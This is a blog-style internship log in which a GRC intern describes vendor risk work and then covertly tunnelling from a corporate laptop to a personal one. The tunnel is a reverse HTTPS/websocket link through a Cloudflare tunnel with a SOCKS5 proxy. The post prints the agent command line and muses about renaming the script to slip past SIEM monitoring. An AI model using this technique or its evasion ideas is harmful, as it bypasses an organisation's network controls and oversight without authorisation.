---
layout: post
title: "Internship Log - Week 7-8"
date: 2026-08-21
category: internship
tags: ["internship", "grc"]
excerpt: "Fourth two weeks as a GRC intern"
---

## Week 7 - Third Party Risk Management

This week I attended a couple of meetings with Procurement team regarding Third Party Risk Management, or TPRM for short. As the GRC team, we have to ensure whether new vendors meet the security standards and if the risk profile matches our risk appetite. So whenever any department within the company would like to use a new software/IT vendor, we send a security questionnaire to the vendor and determine how mission critical the vendor is.

We have made multiple TPRM automation workflows that automates just this. We are also planning on integrating more deeply with procurement and taking security into account even before a vendor is selected.

## Week 8 - Biggest finding yet

This is serious.

For context, I was asked to automate tickets using AI. As GRC team, we get multiple tickets a day where we have to approve/deny changes to software, someone asking for access to unusual systems, things of that nature. Some tickets are too long and take more than 10 minutes to read through. So my task was to make an automation that read through the tickets and provides individual insight on each of them, short summary, whether there are red flags, etc.

Now, I am a big fan of linux and use it as a daily driver. The performance and the minimalism just appeals to me. I also love working with the terminal. The corporate laptop is a bloated windows 11 with XDR and DLP software installed on them. Long story short, it is laggy. The issue is that the ticketing system is on intranet and I can't access it from my personal laptop, which is a huge inconvenience for me. You might see where I'm going with this.

I wanted to access the intranet from my laptop, which made me think whether that was possible for a malicious actor. I decided to use the corporate laptop as a proxy.

I already knew the network was pretty restricted and that most ports (even protocols) are disabled. I tried using port 443 (https) to make an ssh connection, which failed. It shouldn't come as a suprise that websites aren't whitelisted, rather websites that shouldn't be accessed are blacklisted. You can only blacklist so many websites. 

Therefore, I decided to make a reverse https tunnel, where the corporate laptop will connect to my personal laptop, and my personal laptop will expose a SOCKS5 proxy which routes traffic through corporate laptop. I wrote a python script for both the agent (corporate) and controller (personal). The controller script hosted a web server with websocket and exposed it to internet via cloudflare tunnels. The agent script took tunnel as the argument and connected. Once the agent connected, controller script started a socks5 proxy, which I then utilized to access that internal ticketing system. I also accessed an internal server via ssh. I was ecstatic. A malicious actor could exfiltrate data and infiltrate the network with this setup.

This was a huge problem, because there is no realistic way to prevent it on the network level. The traffic is genuinely HTTPS. The agent worked using python. 

I was contacted by Security Operations Center (SOC) around half an hour later, which is way too late. I would know, being in the GRC team and working with security policies. They texted me through the internal communications app, sent the log of the command I ran and asked what the script was doing. Now, I made a rookie mistake at this point, because the command looked like this:
```bash
python vtunnel.py agent some-random-words.trycloudflare.com:443
```
Looks pretty suspicious, if you ask me: "vtunnel.py", "agent", random URL with port specified. It's almost like I wanted to get caught. I actually thought of hardcoding the parameters and changing the filename so it looks less suspicious on SIEM or better yet, gets ignored altogether. But I didn't really care, as I was going to report the finding anyway.

This taught me a lot. It's honestly scary to think that there are malicious actors who think of and find outlandish ways of causing harm. Good thing I thought of it first.